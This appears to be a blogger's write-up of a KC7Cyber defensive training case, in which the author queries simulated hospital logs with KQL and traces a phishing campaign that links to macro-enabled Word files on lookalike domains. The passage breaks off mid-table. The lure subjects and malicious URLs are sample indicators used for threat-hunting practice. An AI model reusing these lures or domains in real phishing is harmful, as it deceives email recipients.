@@ -1,0 +1,2062 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>shoutvoid - kc7cyber writeup - moderate - azure crest</title>
+    <link rel = "stylesheet" href = "../../../css/variables.css">
+    <link rel = "stylesheet" href = "../../../css/style.css">
+    <link rel = "stylesheet" href = "../../../css/kc7writeup.css">
+  </head>
+  <body id="top">
+    <div class="sidebar">
+      <header><!--website header-->
+        <h1>shoutvoid</h1>
+        <p>Aspiring cybersecurity professional</p>
+      </header><!--website header-->
+      <nav class="site-nav"> <!--site-wide navigation-->
+        <a href="../../../index.html">About</a>
+        <a href="../../writeups.html">Writeups</a>
+      </nav> <!--site-wide navigation-->
+      <nav class="page-nav" id="page-navigation"> <!--page navigation sidebar-->
+        <ol class="page-toc"><!--page toc-->
+          <a class="skip" href="#page-main">Skip to main content</a>
+          <li><a href="#intro">Introduction</a></li><!--link to intro-->
+          <li><a href=#sections>Sections</a><!--all sections-->
+            <ol class="section-toc"><!--section-toc-->
+              <li class="section1-toc"><!--individual section toc-->
+                <a href=#section1>Section 1 - KQL 101</a>
+              </li><!--individual section toc-->
+              <li class="section2-toc"><!--individual section toc-->
+                <a href=#section2>Section 2 - Quarantine Quandary</a>
+              </li><!--individual section toc-->
+              <li class="section3-toc"><!--individual section toc-->
+                <a href=#section3>Section 3 - The Phisher's Net</a>
+              </li><!--individual section toc-->
+              <li class="section4-toc"><!--individual section toc-->
+                <a href=#section4>Section 4 - dERPy Database</a>
+              </li><!--individual section toc-->
+              <li class="section5-toc"><!--individual section toc-->
+                <a href=#section5>Section 5 - Bonus: Mo' Money Mo' Problems</a>
+              </li><!--individual section toc-->
+            </ol><!--section-toc-->
+          </li><!--all sections-->
+        </ol> <!--page-toc class-->
+      </nav> <!--page navigation sidebar-->
+      <footer><!--website footer-->
+        <p>Made with vanilla HTML + CSS by shoutvoid</p>
+        <address>
+          <a href="mailto:shoutvoid@proton.me">shoutvoid@proton.me</a>
+          <a href="https://github.com/ShoutVoid">GitHub</a>
+          <a href="https://play.picoctf.org/users/shoutvoid">picoCTF</a>
+          <a href="https://kc7cyber.com/profile/shoutvoid">KC7Cyber</a>
+        </address>
+      </footer><!--website footer-->
+    </div>
+    <main id="page-main"> <!--main page content-->
+      <article id="intro"> <!--introduction-->
+        <h1>Azure Crest</h1>
+        <p>KC7's first "moderate" difficulty challenge. The player assumes the role of security analyst tasked with detecting any intrusions against Azure Crest Hospital, a mayor healthcare provider with over 200 employees; recently, there's been cost-cutting measures and attempts at streamlining operations, including using a custom-made (!) Enterprise Resource Planning (ERP) system developed by the hospital's Database Administrator (!!), which centralizes all records and information in a single server (!!!).</p>
+        <p>The case comes with <a href="https://kc7cyber.com/guide/174">a training guide</a> with additional backstory and context, along with basic KQL tips. Its most useful piece of information is a list of official partners: MedEquipPros (medequippros.org), Pharma Best (pharmabest.net), Health Records Systems (healthrecordsystems.tech), and Emergency Care Partners (emergencycarepartners.com)</p>
+      </article> <!--introduction-->
+      <article id=sections><!--the game sections-->
+        <h2>Sections</h2>
+        <section id="section1"><!--section 1-->
+          <h3>Section 1 - KQL 101</h3>
+          <p>I'll start by scoping out Azure Crest's size and employee distribution.</p>
+          <pre><kbd>Employees
+| count</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>Count</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>250</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <pre><kbd>Employees
+| summarize count() by role</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>role</th>
+                    <th>count_</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>Support Staff</td>
+                    <td>66</td>
+                  </tr>
+                  <tr>
+                    <td>Administrative Staff</td>
+                    <td>61</td>
+                  </tr>
+                  <tr>
+                    <td>Medical Staff</td>
+                    <td>50</td>
+                  </tr>
+                  <tr>
+                    <td>Resident Doctors</td>
+                    <td>40</td>
+                  </tr>
+                  <tr>
+                    <td>Interns</td>
+                    <td>20</td>
+                  </tr>
+                  <tr>
+                    <td>IT Staff</td>
+                    <td>5</td>
+                  </tr>
+                  <tr>
+                    <td>Head of Emergency Medicine</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Financial Officer</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Administrative Officer</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>IT Director</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>Chief Medical Officer</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>Database Administrator</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>Director of Nursing</td>
+                    <td>1</td>
+                  </tr>
+                  <tr>
+                    <td>Head of Surgery</td>
+                    <td>1</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>There are 250 employees, with most being administrative or support staff, closely followed by medical staff and residential doctors. The hospital's IT department is very small, with only 5 persons as IT staff, a single IT director and a single database administrator.</p>
+        </section> <!--section 1-->
+        <section id="section2"><!--section 2-->
+          <h3>Section 2 - Quarantine Quandary</h3>
+          <p>There was an alert that a file got quarantined a few days ago; the filename contains the string "healthcare". I was told false positives are rather common, but better be safe than sorry.</p>
+          <pre><kbd>SecurityAlerts
+| where description contains "healthcare"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>alert_type</th>
+                    <th>severity</th>
+                    <th>description</th>
+                    <th>indicators</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-03-14 10:39:26.0000</td>
+                    <td>HOST</td>
+                    <td>high</td>
+                    <td>A suspicious file was quarantined on host ZQHM-LAPTOP: New_Healthcare_Protocols.docm</td>
+                    <td>[{'hostname': 'ZQHM-LAPTOP', 'filename': 'New_Healthcare_Protocols.docm', 'sha256': '9195246412dc64c15e429887cac945bbde13c249d25dad01c7245219d1ac021a'}]</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 16:41:08.0000</td>
+                    <td>EMAIL</td>
+                    <td>med</td>
+                    <td>Employee milowe reported a suspicious email with the subject "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"</td>
+                    <td>[{'username': 'milowe', 'subject': '[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨'}]</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>There are two alerts: one for the quarantined file, and another for an email reported as suspicious by user <samp>milowe</samp> (Resident Doctor Michel Lowe). The suspicious quarantined file is named <samp>New_Healthcare_Protocols.docm</samp> and has the hash <samp>9195246412dc64c15e429887cac945bbde13c249d25dad01c7245219d1ac021a</samp> (which doesn't have any hits on VirusTotal). I decide to investigate the email first, since between the file being quarantined automatically by security software and the email being reported suspicious they could be connected, such as being part of a phishing campaign.</p>
+          <pre><kbd>Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-03-06 11:49:48.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>michael_frith@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-06 11:49:48.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>jerry_jones@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 11:57:55.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>susan_deloatch@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 11:57:55.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>archie_mireles@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 11:57:55.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>claire_nastasi@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>michael_bauer@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>constance_eldredge@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>michel_lowe@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>bradley_park@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Immediately, there are a bunch of what are very clearly phishing emails; the links all lead to a download for macro-enabled Microsoft Word documents (<samp>.docm</samp>); the quarantined file <samp>New_Healthcare_Protocols.docm</samp> and <samp>Pediatric_Care_Update.docm</samp>; the senders are all suspicious domains, likely an attempt at typosquatting or impersonation of trusted third-parties. In order to get a better scope of the problem, I use:</p>
+          <pre><kbd>let bad_emails =
+Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"
+| distinct sender;
+let bad_domains =
+Email
+| where sender in (bad_emails)
+or reply_to in (bad_emails)
+| distinct tostring(parse_url(link).Host);
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+//| distinct tostring(parse_url(link).Host)</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>sender</th>
+                    <th>reply_to</th>
+                    <th>recipient</th>
+                    <th>subject</th>
+                    <th>verdict</th>
+                    <th>link</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-03-01 11:50:43.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>joseph_markland@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-01 11:50:43.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>geneva_arthur@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-01 11:50:43.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>elizabeth_harris@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-01 11:50:43.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>melvin_hudgens@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/search/public/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 10:52:18.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>roy_trenneman@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 10:52:18.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>monte_baez@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 10:52:18.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>edward_williamson@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 10:52:18.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>claire_arce@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 10:52:18.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>harry_barnes@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 16:07:35.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>charlene_simpson@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/search/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 16:07:35.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>scott_horwath@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/search/share/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-06 11:49:48.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>michael_frith@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-06 11:49:48.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>jerry_jones@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://medequipamateurs.org/modules/online/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-07 15:17:33.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>eunice_birks@azurecresthospital.med</td>
+                    <td>[EXTERNAL] RE: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/search/published/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:06:07.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>jonathan_bueno@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 🔑 Exclusive Access: Innovative Pediatric Care Techniques Unveiled 🔍</td>
+                    <td>CLEAN</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:06:07.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>maudie_frierson@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 🔑 Exclusive Access: Innovative Pediatric Care Techniques Unveiled 🔍</td>
+                    <td>CLEAN</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:06:07.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>lillian_mcfarland@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 🔑 Exclusive Access: Innovative Pediatric Care Techniques Unveiled 🔍</td>
+                    <td>CLEAN</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-12 14:06:07.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>michael_huberty@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 🔑 Exclusive Access: Innovative Pediatric Care Techniques Unveiled 🔍</td>
+                    <td>CLEAN</td>
+                    <td>http://takeyatimecarepartners.com/files/public/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-13 10:48:18.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>gary_berger@azurecresthospital.med</td>
+                    <td>[EXTERNAL] [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>SUSPICIOUS</td>
+                    <td>http://takeyatimecarepartners.com/online/online/online/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-14 10:27:39.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>scott_thibault@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈</td>
+                    <td>CLEAN</td>
+                    <td>http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-14 10:27:39.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>jerry_jones@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈</td>
+                    <td>CLEAN</td>
+                    <td>http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-15 11:32:43.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>charles_roberge@azurecresthospital.med</td>
+                    <td>[EXTERNAL] RE: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>SUSPICIOUS</td>
+                    <td>https://takeyatimecarepartners.com/search/search/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-15 11:32:43.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>anita_hummel@azurecresthospital.med</td>
+                    <td>[EXTERNAL] RE: 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>SUSPICIOUS</td>
+                    <td>https://takeyatimecarepartners.com/search/search/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-18 10:25:33.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>beatrice_hogg@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/share/search/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-18 10:25:33.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>john_walker@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 🩺 Vital Update: Groundbreaking Pediatric Care Advances 🚀</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/share/search/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 11:52:12.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>dean_aitken@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 11:52:12.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>dolores_rader@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 11:52:12.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>thomas_mccloskey@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-20 11:52:12.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>judy_tomlinson@azurecresthospital.med</td>
+                    <td>[EXTERNAL] FW: [Alert!] Critical Pediatric Care Protocol Revamp 🌟</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/share/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-21 11:38:00.0000</td>
+                    <td>healthupdate@gmail.com</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>sheldon_pella@azurecresthospital.med</td>
+                    <td>[EXTERNAL] [Urgent!] Mandatory Health Protocol Update 😱</td>
+                    <td>CLEAN</td>
+                    <td>https://pharmasecondbest.net/search/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 11:57:55.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>susan_deloatch@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 11:57:55.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>archie_mireles@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-22 11:57:55.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>claire_nastasi@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>https://unhealthyrecordsystems.tech/published/published/images/modules/Pediatric_Care_Update.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>michael_bauer@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>constance_eldredge@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>michel_lowe@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-25 15:47:08.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
+                    <td>bradley_park@azurecresthospital.med</td>
+                    <td>[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨</td>
+                    <td>CLEAN</td>
+                    <td>http://medequipamateurs.org/online/share/images/New_Healthcare_Protocols.docm</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-26 16:17:59.0000</td>
+                    <td>medstaffinfo@hospitalcomm.org</td>
